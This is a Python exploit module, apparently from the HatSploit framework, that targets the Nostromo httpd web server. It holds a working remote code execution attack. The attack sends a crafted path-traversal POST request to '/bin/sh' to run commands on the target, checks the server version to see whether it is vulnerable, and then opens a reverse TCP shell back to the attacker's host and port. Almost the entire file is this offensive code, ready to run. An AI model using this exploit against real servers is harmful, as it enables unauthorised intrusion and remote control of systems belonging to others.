#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import Module
from utils.handler.handler import Handler
from utils.http.http import HTTPClient
from utils.tcp.tcp import TCPClient


class HatSploitModule(Module, Handler, HTTPClient, TCPClient):
    details = {
        'Name': "Nostromo Httpd Remote Code Execution",
        'Module': "exploit/multi/nostromo_httpd/remote_code_execution",
        'Authors': [
            'enty8080'
        ],
        'Description': "Remote Code Execution in Nostromo Httpd.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "multi",
        'Risk': "high"
    }

    payload = {
        'Description': "Payload to use.",
        'Value': "unix/generic/sh_reverse_tcp",
        'Categories': [
            'single'
        ],
        'Architectures': None,
        'Platforms': None,
        'Types': [
            'reverse_tcp'
        ]
    }

    options = {
        'RHOST': {
            'Description': "Remote host.",
            'Value': None,
            'Type': "ip",
            'Required': True
        },
        'RPORT': {
            'Description': "Remote port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        },
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def execute_command(self, remote_host, remote_port, command):
        payload = ""
        payload += "POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\n"
        payload += "Content-Length: 1\r\n\r\necho\necho\n"
        payload += f"{command} 2>&1"

        self.tcp_request(
            host=remote_host,
            port=remote_port,
            data=payload
        )

    def check_vulnerable(self, remote_host, remote_port):
        response = self.http_request(
            method="HEAD",
            host=remote_host,
            port=remote_port,
            path="/"
        )

        if response is not None:
            if 'Server' in response.headers.keys():
                server = response.headers['Server']

                if int(server.split('.')[-1]) < 7:
                    return True
        return False

    def run(self):
        remote_host, remote_port, local_host, local_port = self.parse_options(self.options)

        self.output_process(f"Exploiting {remote_host}...")
        if not self.check_vulnerable(remote_host, remote_port):
            self.output_error("Exploit failed!")
            return

        self.output_process("Executing payload stage...")
        self.execute_command(remote_host, remote_port, self.payload['Instructions'])

        self.handle_session(
            host=local_host,
            port=local_port,
            method="reverse",
            payload=self.payload
        )
